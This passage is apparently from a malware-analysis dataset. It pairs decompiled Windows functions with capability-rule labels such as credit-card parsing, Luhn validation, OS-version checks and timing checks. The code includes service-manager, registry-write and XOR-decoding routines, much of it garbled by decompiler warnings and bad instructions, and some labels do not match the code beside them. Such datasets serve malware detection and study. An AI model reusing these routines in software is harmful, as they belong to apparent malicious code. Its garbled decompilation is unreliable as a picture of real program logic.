uVar4 == 0;\n    uVar15 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n    uStack20 = 0xb;\n    uStack18 = 0;\n    uStack24 = 0x165c;\n    uStack22 = 0x41;\n    uStack28 = 0x11;\n    iStack32 = 0x4236f4;\n    uStack36 = 0x4031d6;\n    fcn.00401bf0();\n    if ((uVar17 || cVar19 != cVar18) || (!uVar17 && cVar19 == cVar18)) {\n        uStack36 = 0x12;\n    }\n    pcStack40 = str.7h;\n    uStack44 = 0x11;\n    uStack48 = 0x4236f4;\n    uStack52 = 0x4031f7;\n    uStack52 = fcn.00401bf0();\n    if ((uVar15) || (!uVar15)) {\ncode_r0x0040321b:\n        uStack52 = 0x12;\n        uStack56 = 0x41167c;\n        uStack60 = 0x11;\n        uStack64 = 0x4236f4;\n        uStack68 = 0x40322e;\n        uVar20 = fcn.00401bf0();\n        if ((uVar14 || uVar17) || (!uVar14 && !uVar17)) {\n            uStack68 = 2;\n            uStack72 = 0x411690;\n            uStack76 = 0x11;\n            uVar4 = extraout_CX_00;\n        }\n        else {\n            uVar4 = extraout_CX_00 & 0xff | (extraout_CX_00 >> 8) - *unaff_EBX << 8;\n        }\n    }\n    else {\n        puVar3 = segment(in_SS, *0x10 + -0x30);\n        uVar20 = CONCAT44(0xb7bc9ea5, *puVar3);\n        uVar4 = extraout_CX;\n        if (!uVar14) {\n            if (uVar15) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uVar14 = 0;\n            uVar17 = *0x10 == 0x2c;\n            uStack48 = 0xb7bc9ea5;\n            goto code_r0x0040321b;\n        }\n    }\n    *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffb4;\n    pcVar2 = (uVar20 >> 0x20) + 0x11;\n    *pcVar2 = *pcVar2 + ((uVar4 & 0xff | (uVar4 >> 8) + *(uVar20 + -0x70) << 8) + 1 >> 8);\n    uStack84 = 0x4236f4;\n    uVar20 = fcn.00401bf0();\n    uVar7 = extraout_ECX_00;\n    if ((&stack0xffffffec < 0) || (uVar7 = extraout_ECX_00 & 0xffff,  &stack0xffffffec >= 0)) {\n        uStack24 = 8;\n        uStack22 = 0;\n        uStack28 = 0x411694;\n        iStack32 = 0x11;\n    }\n    iVar6 = uVar20 + (0xffffffbf < &stack0xffffffac);\n    *(iVar6 + 0x68086a2b) = in_SS;\n    pcVar2 = (uVar20 >> 0x20) + 0x11;\n    *pcVar2 = *pcVar2 + (uVar7 + 1 >> 8);\n    bVar13 = *pcVar2 == '\\0';\n    puVar9 = iVar6 + 0x68086a27;\n    *(iVar6 + 0x68086a27) = 0x4236f4;\n    *(iVar6 + 0x68086a23) = 0x40327c;\n    uVar7 = fcn.00401bf0();\n    if ((bVar13) || (*(iVar6 + 0x68086a25) = extraout_CX_01,  !bVar13)) {\n        puVar9 = iVar6 + 0x68086a23;\n        *(iVar6 + 0x68086a23) = 8;\n    }\n    *(puVar9 + -4) = in_SS;\n    uVar12 = *(puVar9 + -4);\n    *(puVar9 + -4) = 0x47;\n    bVar13 = false;\n    bVar16 = (POPCOUNT(uVar7 & 0xc5) & 1U) == 0;\n    *(puVar9 + -8) = 0x41169c;\n    *(puVar9 + -0xc) = 0x11;\n    *(puVar9 + -0x10) = 0x4236f4;\n    *(puVar9 + -0x14) = 0x4032a0;\n    uVar8 = fcn.00401bf0();\n    puVar10 = puVar9 + -0x10;\n    if ((!bVar16) && (*(puVar9 + -0x14) = uVar8,  puVar10 = puVar9 + -0x10,  bVar16)) {\n        segment(in_SS, puVar9 + -0x10);\n        puVar11 = puVar9 + -0x10 & 0xffff0000 | puVar9 - 0xc;\n        if (bVar13) goto code_r0x004032e5;\n        if (bVar16) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar10 = (puVar11 ^ unaff_ESI) - 4;\n        *((puVar11 ^ unaff_ESI) - 4) = 0xb7bc9ea5;\n    }\n    *(puVar10 + -4) = 6;\n    *(puVar10 + -8) = 0x4116a4;\n    *(puVar10 + -0xc) = 0x11;\n    *(puVar10 + -0x10) = 0x4236f4;\n    *(puVar10 + -0x14) = 0x4032d7;\n    uVar8 = fcn.00401bf0();\n    puVar11 = puVar10 + 0x20;\n    *(puVar10 + 0x1c) = uVar8;\ncode_r0x004032e5:\n    *(puVar11 + -4) = 7;\n    *(puVar11 + -8) = 0x4116ac;\n    *(puVar11 + -0xc) = 0x11;\n    *(puVar11 + -0x10) = 0x4236f4;\n    *(puVar11 + -0x14) = 0x4032f8;\n    uVar20 = fcn.00401bf0();\n    *(puVar11 + -4) = uVar20;\n    *(puVar11 + -8) = extraout_ECX_01;\n    *(puVar11 + -0xc) = uVar20 >> 0x20;\n    *(puVar11 + -0x10) = unaff_EBX;\n    *(puVar11 + -0x14) = puVar11;\n    *(puVar11 + -0x18) = unaff_EBP;\n    *(puVar11 + -0x1c) = unaff_ESI;\n    *(puVar11 + -0x20) = uVar12;\n    uVar12 = *(puVar11 + -0x20);\n    uVar7 = *(puVar11 + -0x10);\n    *(puVar11 + -4) = 7;\n    *(puVar11 + -8) = 0x4116b4;\n    *(puVar11 + -0xc) = 0x11;\n    *(puVar11 + -0x10) = 0x4236f4;\n    *(puVar11 + -0x14) = 0x40332a;\n    uVar8 = fcn.00401bf0();\n    *(puVar11 + -4) = uVar8;\n    *(puVar11 + -6) = uVar7;\n    uVar4 = *(puVar11 + -6);\n    *(puVar11 + -4) = 6;\n    *(puVar11 + -8) = 0x4116bc;\n    *(puVar11 + -0xc) = 0x11;\n    *(puVar11 + -0x10) = 0x4236f4;\n    *(puVar11 + -0x14) = 0x403358;\n    uVar5 = fcn.00401bf0();\n    *(puVar11 + -4) = extraout_ECX_02;\n    *(puVar11 + -8) = uVar12;\n    *(puVar11 + -10) = uVar5;\n    *(puVar11 + -4) = 0x25;\n    *(puVar11 + -8) = 0x4116c4;\n    *(puVar11 + -0xc) = 0x11;\n    *(puVar11 + -0x10) = 0x4236f4;\n    *(puVar11 + -0x14) = 0x403393;\n    fcn.00401bf0();\n    *(puVar11 + -4) = (uVar7 >> 8 & 0xffff00) << 8 | uVar4;\n    *(puVar11 + -8) = extraout_ECX_03;\n    *(puVar11 + -4) = 8;\n    *(puVar11 + -8) = 0x4116ec;\n    *(puVar11 + -0xc) = 0x11;\n    *(puVar11 + -0x10) = 0x4236f4;\n    *(puVar11 + -0x14) = 0x4033bf;\n    fcn.00401bf0();\n    return;\n}\n",
        "token_count": 3388
    },
    "004041d0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004041d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 186
    },
    "004036d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004036fe) overlaps instruction at (ram,0x004036fd)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.004036d0(void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    ushort in_ES;\n    bool bVar3;\n    uint lpVersionInformation;\n    uint32_t var_90h;\n    uint var_8ch;\n    \n    puVar2 = &stack0xfffffffc;\n    bVar3 = SBORROW4(&stack0xfffffffc, 0x94);\n    lpVersionInformation = 0x94;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if ((!bVar3) && (bVar3)) {\n        *unaff_EDI = *unaff_ESI;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h < 6) || (5 < var_90h)) {\n        bVar3 = var_90h == 6;\n    }\n    else {\n        bVar3 = true;\n        *unaff_EDI = *unaff_ESI;\n        puVar2 = 0xffffff70;\n        *(iVar1 + -4) = in_ES;\n    }\n    if ((bVar3) && (*(puVar2 + -0x8c) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 376
    },
    "00403880": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403880(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)();\n    uVar2 = 0;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h);\n    return iVar1 == 0;\n}\n",
        "token_count": 182
    },
    "00404280": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00404280(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.004041d0(0x80000002, 0x41143c, 0x411488, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00404460": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404460(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    bool bVar7;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x4112f0, arg_8h);\n    (*pcVar2)(&var_264h, 0x411308, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    bVar7 = false;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        bVar7 = *pcVar6 != '\\0';\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_44h = ~uVar4 - 1;\n    var_34h = 0x411330;\n    var_30h = 0x41133c;\n    var_2ch = 0x411348;\n    var_28h = 0x411358;\n    var_24h = 0x411360;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((!bVar7 && var_44h != 0) && (bVar7 || var_44h == 0)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1165
    },
    "004037a0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004037cc)\n// WARNING: Removing unreachable block (ram,0x004037d0)\n// WARNING: Removing unreachable block (ram,0x004037d1)\n\nbool fcn.004037a0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x4116c4, 0x4116ec, &var_8h, &var_10ch, &var_4h);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(0xf0, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(0xf0);\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 381
    },
    "00404bc0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404d15) overlaps instruction at (ram,0x00404d13)\n// \n// WARNING: Removing unreachable block (ram,0x00404c15)\n\nuint __cdecl fcn.00404bc0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uint8_t uVar2;\n    uint uVar3;\n    uint in_EAX;\n    int32_t iVar4;\n    uint extraout_ECX;\n    uint uVar5;\n    int32_t unaff_EBX;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    ushort in_SS;\n    bool bVar9;\n    uchar var_24h;\n    uint var_23h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint *var_4h;\n    \n    bVar9 = (POPCOUNT((in_EAX >> 8 ^ 0x68) & 0x30) & 1U) == 0;\n    if (((!bVar9) && (bVar9)) && (segment(in_SS, *0x10 + -0x34),  bVar9)) {\n        uStack24 = *(unaff_EBX + 8);\n        uVar5 = *(unaff_EBX + -4);\n        uStack32 = 0x404ba4;\n        uStack28 = uVar5;\n        uVar3 = fcn.004035d0();\n        uStack28 = 0x404bb0;\n        uStack24 = uVar5;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        return uVar3;\n    }\n    var_4h = fcn.00401d30(arg_18h, arg_1ch, 0x4112b8, 7);\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    if (var_4h != NULL) {\n        var_24h = 0;\n        puVar7 = &fcn.00404bc0::var_23h;\n        for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = 0;\n        *(puVar7 + 2) = 0;\n        uVar6 = 0;\n        do {\n            uVar2 = (*pcVar1)();\n            (&stack0xffffffd8)[uVar6] = uVar2;\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < 0x20);\n        bVar9 = (uVar2 ^ 0xca) < '\\0';\n        puVar7 = &stack0xffffffd8;\n        puVar8 = var_4h;\n        for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar8 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        fcn.004042d0(arg_8h, arg_ch, arg_10h, arg_14h, &stack0xffffffd8, 0x20, var_4h);\n        if ((bVar9) || (uVar5 = extraout_ECX,  !bVar9)) {\n            uVar5 = arg_1ch;\n        }\n        fcn.004024a0(arg_18h, uVar5);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 832
    },
    "00404d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404d40(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00402000;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x411270;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00401000": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401021) overlaps instruction at (ram,0x0040101f)\n// \n\nuint fcn.00401000(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    ulong uVar3;\n    uchar auStack800 [260];\n    uchar auStack540 [260];\n    uchar auStack280 [260];\n    uchar auStack20 [4];\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    // [00] -r-x section size 20480 named .text\n    uStack16 = 0x104;\n    if ((0x31b < &stack0xfffffffc && *0x10 != 0x320) && (0x31b >= &stack0xfffffffc || *0x10 == 0x320)) {\n        *(unaff_EDI + -0x73) = *(unaff_EDI + -0x73) - &stack0xfffffcdc;\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(auStack540, &uStack16);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uStack8 = 0x104;\n    uStack12 = 0x104;\n    uVar3 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)\n                      (0, auStack540, auStack280, &uStack8, auStack800, &uStack12, auStack20);\n    iVar1 = uVar3;\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if ((iVar1 < 1) || (iVar2 = uVar3 >> 0x20,  0 < iVar1)) {\n        iVar2 = param_1;\n    }\n    (**(iVar2 + 0x50))();\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 489
    },
    "00401b60": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401b60(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 147
    },
    "00401bf0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401c48) overlaps instruction at (ram,0x00401c46)\n// \n\nvoid __thiscall fcn.00401bf0(uint32_t param_1)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    char *unaff_EBX;\n    uchar *puVar5;\n    uchar *unaff_ESI;\n    uchar *puVar6;\n    uint32_t unaff_EDI;\n    uint16_t in_CS;\n    bool bVar7;\n    bool bVar8;\n    uint32_t in_stack_00000010;\n    uint32_t uStack28;\n    \n    bVar7 = false;\n    bVar8 = in_stack_00000010 == 0;\n    puVar5 = &stack0xfffffffc;\n    puVar6 = unaff_ESI;\n    if (0 < in_stack_00000010) {\n        do {\n            if ((bVar7 || bVar8) || (!bVar7 && !bVar8)) {\n                uStack28 = *(puVar5 + 0x10);\n                puVar5[-1] = *(*(puVar5 + -8) + uStack28);\n            }\n            else {\n                cVar2 = *unaff_EBX;\n                puVar1 = unaff_EDI - 0x75;\n                puVar5 = *puVar1;\n                *puVar1 = *puVar1 - &stack0xffffffe8;\n                unaff_EBX[0x148af84d] = unaff_EBX[0x148af84d] + param_1 + (puVar5 < &stack0xffffffe8);\n                *(in_stack_00000010 + 0x8b60ff55) =\n                     *(in_stack_00000010 + 0x8b60ff55) +\n                     (param_1 & 0xffff0000 | CONCAT11((param_1 >> 8) - cVar2, param_1));\n                puVar6[-0x47] = 0;\n                uStack28 = uStack28 & 0xffff0000 | in_CS;\n            }\n            iVar3 = *(unaff_ESI + -8);\n            in_stack_00000010 = iVar3 % *(unaff_ESI + 0xc);\n            uVar4 = unaff_ESI[-1] ^ *(in_stack_00000010 + *(unaff_ESI + 8));\n            unaff_EBX = uVar4;\n            unaff_ESI[0x458b58c6] = 0x14;\n            puVar6 = *(unaff_ESI + 0x10);\n            puVar6[iVar3] = in_stack_00000010 ^ uVar4;\n            param_1 = iVar3 + 1;\n            bVar7 = param_1 < in_stack_00000010;\n            bVar8 = param_1 == in_stack_00000010;\n            *(unaff_ESI + -8) = param_1;\n            puVar5 = unaff_ESI;\n            unaff_EDI = uStack28;\n        } while (param_1 < in_stack_00000010);\n    }\n    return;\n}\n",
        "token_count": 709
    },
    "00401dc0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401dc0(uint arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.004010d0(hSCManager, arg_8h);\n    uVar1 = fcn.00401f80(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 131
    },
    "004033d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/01bb0ec37f0e4f748bf40bf8ad1af4de",
            "validate payment card number using luhn algorithm with lookup table/fb60ffb548f34d1da43070d509ac9033"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403432) overlaps instruction at (ram,0x00403430)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004033d0(int32_t arg_8h, int32_t arg_ch, char *arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    char cVar4;\n    uint32_t uVar3;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint8_t unaff_BL;\n    uint *puVar7;\n    int32_t iVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar8 = 0;\n    if (0 < arg_14h) {\n        iVar5 = arg_14h * 2;\n        puVar7 = 0x1;\n        do {\n            bVar9 = (POPCOUNT(unaff_BL + 1 ^ 0x50) & 1U) != 0;\n            uVar3 = arg_14h & 0xffffff00 | arg_10h[iVar8];\n            if (bVar9) {\n                if (!bVar9) {\n                    out(*puVar7, arg_10h);\n                    do {\n                        cVar4 = uVar3 >> 8;\n                        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n                        uVar3 = CONCAT31(CONCAT21(uVar3 >> 0x10, cVar4 - in_AF), -in_AF);\n                    } while (in_AF || cVar4 == *arg_10h);\n                    piVar1 = iVar8 + arg_10h * 2;\n                    *piVar1 = (*piVar1 + 0x7b) - in_AF;\n                    *(iVar5 + -0x75) = uVar3;\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n            unaff_BL = *(puVar7 % arg_ch + arg_8h);\n            uVar2 = arg_14h * 2;\n            uVar6 = uVar2 ^ arg_10h[iVar8] ^ *((puVar7 + -1) % arg_ch + arg_8h);\n            *(arg_18h + -1 + puVar7) = uVar6;\n            if (-1 < uVar6) {\n                if (-1 >= uVar6) {\n                    *(iVar8 + 0x1c) = in_ST0;\n                    iVar8 = iVar8 + 5;\n                    puVar7 = puVar7 + 5;\n                    in_ST0 = in_ST1;\n                    in_ST1 = in_ST2;\n                    in_ST2 = in_ST3;\n                    in_ST3 = in_ST4;\n                    in_ST4 = in_ST5;\n                    in_ST5 = in_ST6;\n                    in_ST6 = in_ST7;\n                }\n            }\n            iVar8 = iVar8 + 1;\n            *(puVar7 + arg_18h) = uVar2 ^ unaff_BL;\n            iVar5 = arg_18h;\n            puVar7 = puVar7 + 2;\n        } while (iVar8 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 813
    },
    "00403940": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004039af) overlaps instruction at (ram,0x004039ac)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403940(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    uint *in_FS_OFFSET;\n    bool bVar8;\n    ulong uVar9;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4052a0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x41165c);\n    bVar8 = false;\n    if (uVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = uVar1;\n    uVar9 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(str.7h);\n    if ((bVar8) || (piVar6 = uVar9 >> 0x20,  !bVar8)) {\n        piVar6 = arg_8h;\n    }\n    uVar1 = uVar1 ^ *(uVar1 + 0xe58be73);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(piVar6, uVar9, 0, 0, 2, 1000, &var_18h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, 0x41167c);\n    if (pcVar2 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar3 = (*pcVar2)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar3 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar3 